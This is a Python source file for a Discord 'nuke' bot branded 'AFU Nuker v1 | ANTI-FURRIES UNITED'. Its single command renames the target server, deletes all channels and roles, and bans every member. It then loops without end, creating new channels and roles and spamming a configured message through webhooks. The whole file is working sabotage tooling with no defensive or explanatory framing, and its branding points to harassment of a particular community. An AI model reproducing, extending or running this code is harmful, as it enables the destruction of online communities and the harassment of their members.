import random,discord,os,asyncio,json,requests
from discord.ext import commands
from colorama import Fore
from pystyle import *
import ctypes


with open("AFU Nuker v1\config.json", "r") as j:
    config = json.load(j)
    token = config["TOKEN"]
    msg = config["MESSAGE"]
    name = config["CHANNELNAMES"]
    prefix = config["PREFIX"]
    rolename = config["ROLENAME"]
    guildname = config["SERVERNAME"]

bot = commands.Bot(command_prefix=prefix,intents=discord.Intents.all(),help_command=None)

y = Fore.LIGHTYELLOW_EX
m = Fore.LIGHTMAGENTA_EX
lr = Fore.LIGHTRED_EX


def menu():
    ctypes.windll.kernel32.SetConsoleTitleW("AFU Nuke Bot v1 | ANTI-FURRIES UNITED")
      
    Write.Print(" .----------------.  .----------------.  .----------------.\n", Colors.light_blue, interval=0.000)
    Write.Print("| .--------------. || .--------------. || .--------------. |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| |      __      | || |  _________   | || | _____  _____ | |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| |     /  \     | || | |_   ___  |  | || ||_   _||_   _|| |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| |    / /\ \    | || |   | |_  \_|  | || |  | |    | |  | |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| |   / ____ \   | || |   |  _|      | || |  | '    ' |  | |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| | _/ /    \ \_ | || |  _| |_       | || |   \ `--' /   | |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| ||____|  |____|| || | |_____|      | || |    `.__.'    | |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| |              | || |              | || |              | |\n", Colors.purple_to_red, interval=0.000)
    Write.Print("| '--------------' || '--------------' || '--------------' |\n", Colors.purple_to_red, interval=0.000)
    Write.Print(" '----------------'  '----------------'  '----------------'\n", Colors.light_blue, interval=0.000)

@bot.event
async def on_connect():
    try:
        os.system('cls')
        menu()
        print(f""" 
{lr}=================================================================={Fore.RESET}
{y}╔════════════════════════════════════╗{Fore.RESET}              
{y}|    Prefix: {prefix}                       {Fore.RESET} 
{y}|    Command: {prefix}afu                   {Fore.RESET} 
{y}|    Bot's Info:                                  {Fore.RESET}       
{y}|        Name: {bot.user}      {Fore.RESET} 
{y}|        Status: {bot.status}              {Fore.RESET} 
{y}|        Guilds: {len(bot.guilds)}                   {Fore.RESET} 
{y}╚════════════════════════════════════╝{Fore.RESET}     
{lr}=================================================================={Fore.RESET}
""")
    except:
        print("Failed to launch the bot")
        print('-------------------------')
        os.system('pause')
async def banmem(guild, member):
    try:
        lists=[member.ban() for member in guild.members]
        asyncio.gather(*lists)
    except:
        while True:
            for member in guild.members:
                await member.ban()


@bot.command()
async def afu(ctx):
    guild = ctx.guild
    print(f"Nuking {guild.name}")
    try:
        await guild.edit(name=guildname)
    except:
        pass
    try:
        chanlist=[channel.delete() for channel in guild.channels]
        asyncio.gather(*chanlist)

    except discord.errors.Forbidden:
        pass
    try:
        await guild.create_text_channel(name="United x Uprising")
        rollist=[role.delete() for role in guild.roles]
        asyncio.gather(*rollist)
    except discord.errors.Forbidden:
        pass
    try:        
        for mem in guild.members:
            await banmem(guild,mem)
    except discord.errors.Forbidden:
        pass

    async def spam_with_webhook(channel):
        try:
            webhook = await channel.create_webhook(name="AFU Webhook")
            while True:
                try:
                    requests.post(webhook.url, json={"content": msg})
                    await asyncio.sleep(0.5)
                except:
                    break
        except Exception as e:
            print(f"Webhook failed: {e}")

    while True:
        try:
            channel = await guild.create_text_channel(name=f"{name}-{random.randint(100,9999)}")
            await guild.create_role(name=f"{rolename}-{random.randint(999,999999)}")
            bot.loop.create_task(spam_with_webhook(channel))
        except Exception as e:
            print(f"Loop failed: {e}")

# Run bot
bot.run(token)
